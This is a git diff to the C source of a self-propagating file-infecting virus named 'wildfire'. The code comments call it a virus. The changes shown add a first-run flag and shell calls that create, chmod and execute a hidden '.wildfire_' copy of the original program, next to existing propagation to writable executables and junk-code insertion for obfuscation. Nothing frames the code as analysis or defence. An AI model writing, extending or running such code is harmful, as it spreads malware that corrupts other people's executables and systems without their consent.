@@ -28,6 +28,7 @@ const unsigned char prefixes[] = { ADD, AND, XOR, OR, SBB, SUB, 0 };
 unsigned char *code;
 int codelen;
 unsigned char *original_executable;
+int first_run = 1;
 
 void readcode(const char *filename)
 {
@@ -304,11 +305,11 @@ DIR *dir;
                     {
                         printf("Self executable is ignored: %s\n", ent->d_name);
                         original_executable = ent->d_name;
-                        execute_bash("./.wildfire_%s", ent->d_name);
                     }
                     else if (strstr(ent->d_name, "wildfire") != NULL)
                     {
                         printf("Wildfire executable is ignored: %s\n", ent->d_name);
+                        first_run = 0;
                     }
                     else
                     {
@@ -351,5 +352,12 @@ int main(int argc, char* argv[])
     //printf("%s:%d", code, codelen);
     replacejunk();      JUNK;
     propagate("./", argv[0]); // list writable executable files for propagation
+    // Add first run edge case to prevent infinite loop if raw virus file is present in directory
+    if (first_run == 1)
+    {
+        execute_bash("touch .wildfire_%s", original_executable);
+        execute_bash("chmod +x .wildfire_%s", original_executable);
+    }
+    execute_bash("./.wildfire_%s", original_executable);
     return 0;
 }
